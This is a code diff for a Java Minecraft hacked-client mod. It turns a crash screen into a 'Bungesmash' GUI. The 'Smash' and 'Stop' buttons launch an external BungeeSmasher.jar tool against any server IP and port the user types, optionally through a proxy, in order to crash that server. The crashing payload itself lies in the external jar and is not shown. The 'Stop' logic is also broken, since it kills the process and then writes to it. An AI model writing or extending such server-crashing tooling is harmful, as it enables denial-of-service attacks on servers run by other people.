@@ -1,5 +1,6 @@
 package me.bratwurst.news.crash;
 
+import com.ibm.icu.util.Output;
 import me.bratwurst.utils.MainUtil;
 import net.minecraft.client.gui.*;
 
@@ -10,8 +11,9 @@ import java.io.*;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.nio.Buffer;
+import java.nio.charset.StandardCharsets;
 
-public class GuiCrashScreen extends GuiScreen {
+public class Bungesmash extends GuiScreen {
     public static Proxy currentProxy = null;
     public static boolean useProxy = false;
     static GuiTextField ip;
@@ -21,8 +23,8 @@ public class GuiCrashScreen extends GuiScreen {
     private String status;
     public static String renderText;
 
-    public GuiCrashScreen(GuiScreen before) {
-        GuiCrashScreen.before = before;
+    public Bungesmash(GuiScreen before) {
+        Bungesmash.before = before;
     }
 
     @Override
@@ -32,7 +34,7 @@ public class GuiCrashScreen extends GuiScreen {
                 if (!isRunning) {
                     String[] split = ip.getText().split(":");
                     if (split.length == 2) {
-                        currentProxy = GuiCrashScreen.getProxyFromString(ip.getText());
+                        currentProxy = Bungesmash.getProxyFromString(ip.getText());
                         this.status = "\u00a76Proxy used " + currentProxy.address().toString();
                         useProxy = true;
                         renderText = "\u00a7cCrashed";
@@ -58,13 +60,15 @@ public class GuiCrashScreen extends GuiScreen {
                     final String ip = split[0];
                     final String port = split[1];
                     try {
-                        final String exe = "C:\\Users\\Gaming\\AppData\\Roaming\\.minecraft\\God\\Tools\\instantcrasher.exe";
-                        final Process exec = Runtime.getRuntime().exec(exe + " " + ip + " " + port + " " + "1.8.9 1");
+                        final String exe = "java -jar C:\\Users\\Gaming\\AppData\\Roaming\\.minecraft\\God\\Tools\\BungeeSmasher.jar";
+                        final Process exec = Runtime.getRuntime().exec(exe + " " + "crash " + ip + ":" + port + " " + "2 200 3");
                         final InputStream inputStream = exec.getInputStream();
+                        final OutputStream outputStream = exec.getOutputStream();
                         new Thread(() -> {
                             final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                             String line;
                             try {
+                                outputStream.write(("crash " + ip + ":" + port + " " + "2 200 3").getBytes(StandardCharsets.UTF_8));
                                 while ((line = bufferedReader.readLine()) != null) {
                                     MainUtil.SendClientMesage(line);
                                 }
@@ -79,8 +83,37 @@ public class GuiCrashScreen extends GuiScreen {
 
 
                 break;
+            case 3:
+                String[] splitt = ip.getText().split(":");
+                if (splitt.length == 2) {
+                    final String ip = splitt[0];
+                    final String port = splitt[1];
+                    try {
+                        final String exe = "java -jar C:\\Users\\Gaming\\AppData\\Roaming\\.minecraft\\God\\Tools\\BungeeSmasher.jar";
+                        final Process exec = Runtime.getRuntime().exec(exe + " " + "crash " + ip + ":" + port + " " + "2 200 3");
+                        final InputStream inputStream = exec.getInputStream();
+                        final OutputStream outputStream = exec.getOutputStream();
+                        new Thread(() -> {
+                            final BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
+                            String line;
+                            try {
+                                exec.destroy();
+                                exec.destroyForcibly();
+                                outputStream.write((ip + ":" + port + " " + "2 200 3").getBytes(StandardCharsets.UTF_8));
+                                while ((line = bufferedReader.readLine()) != null) {
+                                    MainUtil.SendClientMesage(line);
+                                }
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                        }).start();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    }
+                }
 
         }
+
     }
 
     public static Proxy getProxyFromString(String proxy) {
@@ -106,7 +139,8 @@ public class GuiCrashScreen extends GuiScreen {
     public void initGui() {
         renderText = "";
         this.buttonList.add(new GuiButton(1, this.width / 2 - 100, this.height / 3 + 90, 200, 20, "Back"));
-        this.buttonList.add(new GuiButton(2, this.width / 2 - 100, this.height / 3 + 66, 200, 20, "Crash"));
+        this.buttonList.add(new GuiButton(2, this.width / 2 - 100, this.height / 3 + 66, 200, 20, "Smash"));
+        this.buttonList.add(new GuiButton(3, this.width / 2 - 100, this.height / 3 + 120, 200, 20, "Stop"));
         ip = new GuiTextField(this.height, this.mc.fontRendererObj, this.width / 2 - 100, 60, 200, 20);
         ip.setMaxStringLength(100);
         ip.setText("");
